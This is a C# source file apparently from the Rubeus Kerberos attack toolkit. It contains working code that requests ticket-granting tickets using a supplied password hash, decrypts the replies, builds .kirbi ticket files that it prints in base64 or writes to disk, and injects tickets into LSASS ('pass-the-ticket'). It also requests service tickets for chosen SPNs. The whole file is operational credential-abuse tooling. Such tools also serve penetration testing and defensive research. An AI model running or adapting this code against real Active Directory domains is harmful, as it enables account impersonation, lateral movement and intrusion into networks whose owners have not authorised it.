using System;
using System.IO;
using System.Linq;
using Asn1;
using Rubeus.lib.Interop;


namespace Rubeus
{

    public class RubeusException : Exception
    {
        public RubeusException(string message)
            : base(message)
        {
        }
    }

    public class KerberosErrorException : RubeusException
    {
        public KRB_ERROR krbError;

        public KerberosErrorException(string message, KRB_ERROR krbError)
            : base(message)
        {
            this.krbError = krbError;
        }
    }

    public class Ask
    {
        public static byte[] TGT(string userName, string domain, string keyString, Interop.KERB_ETYPE etype, string outfile, bool ptt, string domainController = "", LUID luid = new LUID(), bool describe = false)
        {
            try
            {
                return InnerTGT(userName, domain, keyString, etype, outfile, ptt, domainController, luid, describe, true);
            }
            catch (KerberosErrorException ex)
            {
                KRB_ERROR error = ex.krbError;
                Console.WriteLine("\r\n[X] KRB-ERROR ({0}) : {1}\r\n", error.error_code, (Interop.KERBEROS_ERROR)error.error_code);
            }
            catch (RubeusException ex)
            {
                Console.WriteLine("\r\n" + ex.Message + "\r\n");
            }

            return null;
        }

        public static byte[] InnerTGT(string userName, string domain, string keyString, Interop.KERB_ETYPE etype, string outfile, bool ptt, string domainController = "", LUID luid = new LUID(), bool describe = false, bool verbose = false)
        {
            if (verbose)
            {
                Console.WriteLine("[*] Using {0} hash: {1}", etype, keyString);

                if ((ulong)luid != 0)
                {
                    Console.WriteLine("[*] Target LUID : {0}", (ulong)luid);
                }
            }


            string dcIP = Networking.GetDCIP(domainController, false);
            if (String.IsNullOrEmpty(dcIP))
            {
                throw new RubeusException("[X] Unable to get domain controller address");
            }

            if (verbose)
            {
                Console.WriteLine("[*] Building AS-REQ (w/ preauth) for: '{0}\\{1}'", domain, userName);
            }

            byte[] reqBytes = AS_REQ.NewASReq(userName, domain, keyString, etype);

            byte[] response = Networking.SendBytes(dcIP, 88, reqBytes);
            if (response == null)
            {
                throw new RubeusException("[X] No answer from domain controller");
            }

            // decode the supplied bytes to an AsnElt object
            //  false == ignore trailing garbage
            AsnElt responseAsn = AsnElt.Decode(response, false);

            // check the response value
            int responseTag = responseAsn.TagValue;

            if (responseTag == 11)
            {
                if (verbose)
                {
                    Console.WriteLine("[+] TGT request successful!");
                }

                // parse the response to an AS-REP
                AS_REP rep = new AS_REP(responseAsn);

                // convert the key string to bytes
                byte[] key = Helpers.StringToByteArray(keyString);

                // decrypt the enc_part containing the session key/etc.
                // TODO: error checking on the decryption "failing"...
                byte[] outBytes;

                if (etype == Interop.KERB_ETYPE.des_cbc_md5)
                {
                    // KRB_KEY_USAGE_TGS_REP_EP_SESSION_KEY = 8
                    outBytes = Crypto.KerberosDecrypt(etype, Interop.KRB_KEY_USAGE_TGS_REP_EP_SESSION_KEY, key, rep.enc_part.cipher);
                }
                else if (etype == Interop.KERB_ETYPE.rc4_hmac)
                {
                    // KRB_KEY_USAGE_TGS_REP_EP_SESSION_KEY = 8
                    outBytes = Crypto.KerberosDecrypt(etype, Interop.KRB_KEY_USAGE_TGS_REP_EP_SESSION_KEY, key, rep.enc_part.cipher);
                }
                else if (etype == Interop.KERB_ETYPE.aes128_cts_hmac_sha1)
                {
                    // KRB_KEY_USAGE_AS_REP_EP_SESSION_KEY = 3
                    outBytes = Crypto.KerberosDecrypt(etype, Interop.KRB_KEY_USAGE_AS_REP_EP_SESSION_KEY, key, rep.enc_part.cipher);
                }
                else if (etype == Interop.KERB_ETYPE.aes256_cts_hmac_sha1)
                {
                    // KRB_KEY_USAGE_AS_REP_EP_SESSION_KEY = 3
                    outBytes = Crypto.KerberosDecrypt(etype, Interop.KRB_KEY_USAGE_AS_REP_EP_SESSION_KEY, key, rep.enc_part.cipher);
                }
                else
                {
                    throw new RubeusException("[X] Encryption type \"" + etype + "\" not currently supported");
                }


                AsnElt ae = AsnElt.Decode(outBytes, false);

                EncKDCRepPart encRepPart = new EncKDCRepPart(ae.Sub[0]);

                // now build the final KRB-CRED structure
                KRB_CRED cred = new KRB_CRED();

                // add the ticket
                cred.tickets.Add(rep.ticket);

                // build the EncKrbCredPart/KrbCredInfo parts from the ticket and the data in the encRepPart

                KrbCredInfo info = new KrbCredInfo();

                // [0] add in the session key
                info.key.keytype = encRepPart.key.keytype;
                info.key.keyvalue = encRepPart.key.keyvalue;

                // [1] prealm (domain)
                info.prealm = encRepPart.realm;

                // [2] pname (user)
                info.pname.name_type = rep.cname.name_type;
                info.pname.name_string = rep.cname.name_string;

                // [3] flags
                info.flags = encRepPart.flags;

                // [4] authtime (not required)

                // [5] starttime
                info.starttime = encRepPart.starttime;

                // [6] endtime
                info.endtime = encRepPart.endtime;

                // [7] renew-till
                info.renew_till = encRepPart.renew_till;

                // [8] srealm
                info.srealm = encRepPart.realm;

                // [9] sname
                info.sname.name_type = encRepPart.sname.name_type;
                info.sname.name_string = encRepPart.sname.name_string;

                // add the ticket_info into the cred object
                cred.enc_part.ticket_info.Add(info);

                byte[] kirbiBytes = cred.Encode().Encode();

                if (verbose)
                {
                    string kirbiString = Convert.ToBase64String(kirbiBytes);

                    Console.WriteLine("[*] base64(ticket.kirbi):\r\n", kirbiString);

                    if (Rubeus.Program.wrapTickets)
                    {
                        // display the .kirbi base64, columns of 80 chararacters
                        foreach (string line in Helpers.Split(kirbiString, 80))
                        {
                            Console.WriteLine("      {0}", line);
                        }
                    }
                    else
                    {
                        Console.WriteLine("      {0}", kirbiString);
                    }
                }

                if (!String.IsNullOrEmpty(outfile))
                {
                    outfile = Helpers.MakeValidFileName(outfile);
                    if (Helpers.WriteBytesToFile(outfile, kirbiBytes))
                    {
                        if (verbose)
                        {
                            Console.WriteLine("\r\n[*] Ticket written to {0}\r\n", outfile);
                        }
                    }
                }

                if (ptt || ((ulong)luid != 0))
                {
                    // pass-the-ticket -> import into LSASS
                    LSA.ImportTicket(kirbiBytes, luid);
                }

                if (describe)
                {
                    KRB_CRED kirbi = new KRB_CRED(kirbiBytes);
                    LSA.DisplayTicket(kirbi);
                }

                return kirbiBytes;
            }
            else if (responseTag == 30)
            {
                // parse the response to an KRB-ERROR
                KRB_ERROR error = new KRB_ERROR(responseAsn.Sub[0]);
                throw new KerberosErrorException("", error);
            }
            else
            {
                throw new RubeusException("[X] Unknown application tag: " + responseTag);
            }
        }

        public static void TGS(KRB_CRED kirbi, string service, Interop.KERB_ETYPE requestEType = Interop.KERB_ETYPE.subkey_keymaterial, string outfile = "", bool ptt = false, string domainController = "", bool display = true)
        {
            // kirbi            = the TGT .kirbi to use for ticket requests
            // service          = the SPN being requested
            // requestEType     = specific encryption type for the request, Interop.KERB_ETYPE.subkey_keymaterial implies default
            // ptt              = "pass-the-ticket" so apply the ticket to the current logon session
            // domainController = the specific domain controller to send the request, defaults to the system's DC
            // display          = true to display the ticket

            // extract out the info needed for the TGS-REQ request
            string userName = kirbi.enc_part.ticket_info[0].pname.name_string[0];
            string domain = kirbi.enc_part.ticket_info[0].prealm;
            Ticket ticket = kirbi.tickets[0];
            byte[] clientKey = kirbi.enc_part.ticket_info[0].key.keyvalue;

            // the etype for the PA Data for the request, so needs to match the TGT key type
            Interop.KERB_ETYPE paEType = (Interop.KERB_ETYPE)kirbi.enc_part.ticket_info[0].key.keytype;

            string[] services = service.Split(',');
            foreach (string sname in services)
            {
                // request the new service ticket
                TGS(userName, domain, ticket, clientKey, paEType, sname, requestEType, outfile, ptt, domainController, display);
                Console.WriteLine();
            }
        }

        public static byte[] TGS(string userName, string domain, Ticket providedTicket, byte[] clientKey, Interop.KERB_ETYPE paEType, string service, Interop.KERB_ETYPE requestEType = Interop.KERB_ETYPE.subkey_keymaterial, string outfile = "", bool ptt = false, string domainController = "", bool display = true)
        {
            string dcIP = Networking.GetDCIP(domainController, display);
            if (String.IsNullOrEmpty(dcIP)) { return null; }

            if (display)
            {
                if (requestEType == Interop.KERB_ETYPE.subkey_keymaterial)
                {
                    Console.WriteLine("[*] Requesting default etypes (RC4_HMAC, AES[128/256]_CTS_HMAC_SHA1) for the service ticket", requestEType);
                }
                else
                {
                    Console.WriteLine("[*] Requesting '{0}' etype for the service ticket", requestEType);
                }

                Console.WriteLine("[*] Building TGS-REQ request for: '{0}'", service);
            }

            byte[] tgsBytes = TGS_REQ.NewTGSReq(userName, domain, service, providedTicket, clientKey, paEType, requestEType, false, "");

            byte[] response = Networking.SendBytes(dcIP, 88, tgsBytes);
            if (response == null)
            {
                return null;
            }

            // decode the supplied bytes to an AsnElt object
            //  false == ignore trailing garbage
            AsnElt responseAsn = AsnElt.Decode(response, false);

            // check the response value
            int responseTag = responseAsn.TagValue;

            if (responseTag == 13)
            {
                if (display)
                {
                    Console.WriteLine("[+] TGS request successful!");
                }

                // parse the response to an TGS-REP
                TGS_REP rep = new TGS_REP(responseAsn);

                // KRB_KEY_USAGE_TGS_REP_EP_SESSION_KEY = 8
                byte[] outBytes = Crypto.KerberosDecrypt(paEType, Interop.KRB_KEY_USAGE_TGS_REP_EP_SESSION_KEY, clientKey, rep.enc_part.cipher);
                AsnElt ae = AsnElt.Decode(outBytes, false);
                EncKDCRepPart encRepPart = new EncKDCRepPart(ae.Sub[0]);

                // now build the final KRB-CRED structure
                KRB_CRED cred = new KRB_CRED();

                // add the ticket
                cred.tickets.Add(rep.ticket);

                // build the EncKrbCredPart/KrbCredInfo parts from the ticket and the data in the encRepPart

                KrbCredInfo info = new KrbCredInfo();

                // [0] add in the session key
                info.key.keytype = encRepPart.key.keytype;
                info.key.keyvalue = encRepPart.key.keyvalue;

                // [1] prealm (domain)
                info.prealm = encRepPart.realm;

                // [2] pname (user)
                info.pname.name_type = rep.cname.name_type;
                info.pname.name_string = rep.cname.name_string;

                // [3] flags
                info.flags = encRepPart.flags;

                // [4] authtime (not required)

                // [5] starttime
                info.starttime = encRepPart.starttime;

                // [6] endtime
                info.endtime = encRepPart.endtime;

                // [7] renew-till
                info.renew_till = encRepPart.renew_till;

                // [8] srealm
                info.srealm = encRepPart.realm;

                // [9] sname
                info.sname.name_type = encRepPart.sname.name_type;
                info.sname.name_string = encRepPart.sname.name_string;

                // add the ticket_info into the cred object
                cred.enc_part.ticket_info.Add(info);

                byte[] kirbiBytes = cred.Encode().Encode();

                string kirbiString = Convert.ToBase64String(kirbiBytes);

                if (ptt)
                {
                    // pass-the-ticket -> import into LSASS
                    LSA.ImportTicket(kirbiBytes, new LUID());
                }

                if (display)
                {
                    Console.WriteLine("[*] base64(ticket.kirbi):\r\n", kirbiString);

                    if (Rubeus.Program.wrapTickets)
                    {
                        // display the .kirbi base64, columns of 80 chararacters
                        foreach (string line in Helpers.Split(kirbiString, 80))
                        {
                            Console.WriteLine("      {0}", line);
                        }
                    }
                    else
                    {
                        Console.WriteLine("      {0}", kirbiString);
                    }

                    KRB_CRED kirbi = new KRB_CRED(kirbiBytes);
                    LSA.DisplayTicket(kirbi);
                }

                if (!String.IsNullOrEmpty(outfile))
                {
                    outfile = Helpers.MakeValidFileName(outfile);
                    if (Helpers.WriteBytesToFile(outfile, kirbiBytes))
                    {
                        if (display)
                        {
                            Console.WriteLine("\r\n[*] Ticket written to {0}\r\n", outfile);
                        }
                    }
                }

                return kirbiBytes;
            }
            else if (responseTag == 30)
            {
                // parse the response to an KRB-ERROR
                KRB_ERROR error = new KRB_ERROR(responseAsn.Sub[0]);
                Console.WriteLine("\r\n[X] KRB-ERROR ({0}) : {1}\r\n", error.error_code, (Interop.KERBEROS_ERROR)error.error_code);
            }
            else
            {
                Console.WriteLine("\r\n[X] Unknown application tag: {0}", responseTag);
            }
            return null;
        }
    }
}